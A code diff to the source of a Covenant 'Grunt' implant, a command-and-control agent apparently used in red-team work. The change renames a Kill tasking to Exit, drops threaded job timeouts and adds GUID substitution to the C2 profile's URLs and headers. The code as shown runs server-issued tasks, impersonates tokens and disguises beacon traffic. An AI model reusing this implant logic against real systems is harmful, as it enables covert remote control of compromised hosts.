@@ -125,9 +125,9 @@ namespace GruntExecutor
                                 }
                                 messenger.WriteTaskingMessage(output, message.Name);
                             }
-                            else if (message.Type == GruntTaskingType.Kill)
+                            else if (message.Type == GruntTaskingType.Exit)
                             {
-                                output += "Killed";
+                                output += "Exited";
                                 messenger.WriteTaskingMessage(output, message.Name);
                                 return;
                             }
@@ -149,11 +149,8 @@ namespace GruntExecutor
                                     impersonationContext.Undo();
                                 }
                                 IntPtr impersonatedToken = IntPtr.Zero;
-                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
-                                t.Start();
-                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
-                                bool completed = t.Join(5000);
-                                if (completed && impersonatedToken != IntPtr.Zero)
+                                impersonatedToken = TaskExecute(messenger, message);
+                                if (impersonatedToken != IntPtr.Zero)
                                 {
                                     try
                                     {
@@ -275,7 +272,7 @@ namespace GruntExecutor
 
         private static GruntEncryptedMessage Parse(string Format, string Message)
         {
-            string json = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(
+            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
                 Utilities.Parse(Message, Format)[0]
             ));
             if (json == null || json.Length < 3)
@@ -288,7 +285,7 @@ namespace GruntExecutor
         private static string Format(string Format, GruntEncryptedMessage Message)
         {
             return String.Format(Format,
-                Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
+                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
             );
         }
     }
@@ -622,14 +619,14 @@ namespace GruntExecutor
 
         private string GetURL()
         {
-            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)];
+            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
         }
 
         private void SetupCookieWebClient()
         {
             for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
             {
-                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]);
+                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                 if (ProfileHttpHeaderNames[i] == "Cookies")
                 {
                     this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ","));
@@ -707,7 +704,7 @@ namespace GruntExecutor
     {
         Assembly,
         SetOption,
-        Kill,
+        Exit,
         Connect,
         Disconnect,
         Jobs
